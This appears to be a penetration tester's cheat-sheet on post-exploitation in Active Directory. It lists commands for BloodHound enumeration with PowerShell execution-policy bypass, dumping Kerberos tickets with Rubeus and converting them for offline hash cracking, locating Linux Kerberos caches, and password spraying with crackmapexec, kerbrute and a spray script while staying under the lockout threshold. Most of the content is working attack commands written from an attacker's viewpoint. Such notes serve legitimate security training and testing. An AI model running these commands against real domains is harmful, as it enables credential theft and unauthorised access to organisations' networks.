**NTDS.DIT file** — The NTDS.DIT file is a database that stores Active Directory data, including the password hashes for all users in the domain by default its found in  `C:\Windows\NTDS\`


 >BloodHound
```sh

powershell -ep bypass

Import-Module .\Sharphound.ps1

Invoke-BloodHound -CollectionMethod All -OutputDirectory . -OutputPrefix "audit"

#OR 

sharphound.exe -c All --domain <domain> --zipfilename sharp.zip

#back to our attacker machine
#copy the zip file to the attacker machine
neo4j start

./Bloodhound

#drag and drop the zip 

```

### Harvest tickets from Windows

- Mimikatz 
- Rubeus

Rubeus is a tool specifically tailored for Kerberos interaction and manipulation. It's used for ticket extraction and handling, as well as other Kerberos-related activities.

```bash
# Dumping all tickets using Rubeus
.\Rubeus dump
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))

# Listing all tickets
.\Rubeus.exe triage

# Dumping a specific ticket by LUID
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))

# Renewing a ticket
.\Rubeus.exe renew /ticket:<BASE64_TICKET>

# Converting a ticket to hashcat format for offline cracking
.\Rubeus.exe hash /ticket:<BASE64_TICKET>
```

### Harvesting Tickets from Linux

Linux systems store credentials in three types of caches, namely **Files** (in `/tmp` directory), **Kernel Keyrings** (a special segment in the Linux kernel), and **Process Memory** (for single-process use). The **default_cache_name** variable is in `/etc/krb5.conf` that reveals the storage type in use, defaulting to `FILE:/tmp/krb5cc_%{uid}` if not specified.

Checkout
```
https://rp.os3.nl/2016-2017/p97/report.pdf
```

Automated Tools

`https://github.com/TarlogicSecurity/tickey`
### Password Spraying

check for  lockout threshold so we dont lock our account
```
net accounts
```

PowerShell script that enumerates all users and performs authentications according to the _Lockout threshold_ and _Lockout observation window_.

```
.\Spray-Passwords.ps1 -Pass Nexus123! -Admin
```

**NXC**

```
crackmapexec smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success
```

**Kerbrute**

```
.\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "Nexus123!"
``````

### References

- https://infosecwriteups.com/post-exploitation-basics-in-active-directory-enviorment-by-hashar-mujahid-d46880974f87
- https://medium.com/@redfanatic7/detailed-mimikatz-guide-87176fd526c0
- https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.html#harvesting-tickets-from-linux
- https://zer1t0.gitlab.io/posts/attacking_ad/#what-is-active-directory
- https://orange-cyberdefense.github.io/ocd-mindmaps/img/mindmap_ad_dark_classic_2025.03.excalidraw.svg
